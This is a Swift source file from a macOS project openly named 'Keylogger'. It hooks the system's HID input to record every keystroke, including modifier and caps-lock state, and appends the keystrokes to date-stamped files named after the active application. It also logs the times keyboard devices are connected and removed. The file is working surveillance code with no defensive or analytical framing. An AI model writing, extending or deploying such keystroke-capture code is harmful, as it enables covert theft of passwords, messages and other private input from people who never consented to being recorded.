//
//  CallBackFunctions.swift
//  Keylogger
//
//  Created by Skrew Everything on 16/01/17.
//  Copyright © 2017 Skrew Everything. All rights reserved.
//

import Foundation
import Cocoa

class CallBackFunctions
{
    static var CAPSLOCK = false
    static var calander = Calendar.current
    static var prev = ""
    
    static func getDateFolder() -> String {
        return "\(calander.component(.day, from: Date()))-\(calander.component(.month, from: Date()))-\(calander.component(.year, from: Date()))"
    }
    
    static let Handle_DeviceMatchingCallback: IOHIDDeviceCallback = { context, result, sender, device in
        
        let mySelf = Unmanaged<Keylogger>.fromOpaque(context!).takeUnretainedValue()
        
        let dateFolder = getDateFolder()
        
        let path = mySelf.devicesData.appendingPathComponent(dateFolder)
        if !FileManager.default.fileExists(atPath: path.path)
        {
            do
            {
                try FileManager.default.createDirectory(at: path , withIntermediateDirectories: false, attributes: nil)
            }
            catch
            {
                print("Can't Create Folder")
            }
        }
        
        let fileName = path.appendingPathComponent("Time Stamps").path
        if !FileManager.default.fileExists(atPath: fileName )
        {
            if !FileManager.default.createFile(atPath: fileName, contents: nil, attributes: nil)
            {
                print("Can't Create File!")
            }
        }
        let fh = FileHandle.init(forWritingAtPath: fileName)
        fh?.seekToEndOfFile()
        let timeStamp = "Connected - " + Date().description(with: Locale.current) +  "\t\(device)" + "\n"
        fh?.write(timeStamp.data(using: .utf8)!)
    }
    
    static let Handle_DeviceRemovalCallback: IOHIDDeviceCallback = { context, result, sender, device in
        
            
            let mySelf = Unmanaged<Keylogger>.fromOpaque(context!).takeUnretainedValue()
        
            let dateFolder = getDateFolder()
        
            let path = mySelf.devicesData.appendingPathComponent(dateFolder)
            if !FileManager.default.fileExists(atPath: path.path)
            {
                do
                {
                    try FileManager.default.createDirectory(at: path , withIntermediateDirectories: false, attributes: nil)
                }
                catch
                {
                    print("Can't Create Folder")
                }
            }
            
            let fileName = path.appendingPathComponent("Time Stamps").path
            if !FileManager.default.fileExists(atPath: fileName )
            {
                if !FileManager.default.createFile(atPath: fileName, contents: nil, attributes: nil)
                {
                    print("Can't Create File!")
                }
            }
            let fh = FileHandle.init(forWritingAtPath: fileName)
            fh?.seekToEndOfFile()
            let timeStamp = "Disconnected - " + Date().description(with: Locale.current) +  "\t\(device)" + "\n"
            fh?.write(timeStamp.data(using: .utf8)!)
    }
     
    static let Handle_IOHIDInputValueCallback: IOHIDValueCallback = { context, result, sender, device in
        
        let mySelf = Unmanaged<Keylogger>.fromOpaque(context!).takeUnretainedValue()
        let elem: IOHIDElement = IOHIDValueGetElement(device);
        
        var test: Bool
        if (IOHIDElementGetUsagePage(elem) != 0x07) {
            return
        }
        
        let scancode = IOHIDElementGetUsage(elem)
        //If our key is not "a" or "right cmd" exit
        if (scancode < 4 || scancode > 231) {
            return
        }
        
        let pressed = IOHIDValueGetIntegerValue(device)
        
        mySelf.session.update(ch: pressed)
        
        
        //////////////////////////////////////////////////////////
        // Legacy
        //////////////////////////////////////////////////////////
        let dateFolder = getDateFolder()
        let path = mySelf.keyData.appendingPathComponent(dateFolder)
        
        /**
         * Create a new date folder. We use this a a session.
         */
        if !FileManager.default.fileExists(atPath: path.path) {
            do {
                try FileManager.default.createDirectory(at: path , withIntermediateDirectories: false, attributes: nil)
            } catch {
                print("Error: Can't Create Folder")
            }
        }
        
        let fileName = path.appendingPathComponent(mySelf.appName).path
        
        if CallBackFunctions.prev == fileName {
            test = false
        } else {
            test = true
            CallBackFunctions.prev = fileName
        }
        
        if !FileManager.default.fileExists(atPath: fileName) {
            if !FileManager.default.createFile(atPath: fileName, contents: nil, attributes: nil) {
                print("Can't Create File")
            }
        }
        
        /**
         * Write analysis of our captured key events.
         */
        let fh = FileHandle.init(forWritingAtPath: fileName)
        fh?.seekToEndOfFile()
        
        if test {
            let timeStamp = "\n" + Date().description(with: Locale.current) + "\n"
            fh?.write(timeStamp.data(using: .utf8)!)
        }
        
Outside:if pressed == 1 {
            //Capslock == 57
            if scancode == 57{
                CallBackFunctions.CAPSLOCK = !CallBackFunctions.CAPSLOCK
                break Outside
            }
            //One of the following: shift control alt command, either left or right
            if scancode >= 224 && scancode <= 231 {
                fh?.write( (mySelf.keyMap[scancode]![0] + "(").data(using: .utf8)!)
                break Outside
            }
    
            if let key = mySelf.keyMap[scancode] {
                if CallBackFunctions.CAPSLOCK {
                    fh?.write(key[1].data(using: .utf8)!)
                } else {
                    //thread: fatal error unexpectedly found nil while unwrapping an Optional value
                    //maybe that was fixed with the previous unwrap. But it could be the next
                    //force unwrap...
                    fh?.write(key[0].data(using: .utf8)!)
                }
            } else {
                print("we screwed here")
            }
    
        } else {
            //on key release, we close the alt
            if scancode >= 224 && scancode <= 231 {
                fh?.write(")".data(using: .utf8)!)
            }
        }
    }
}
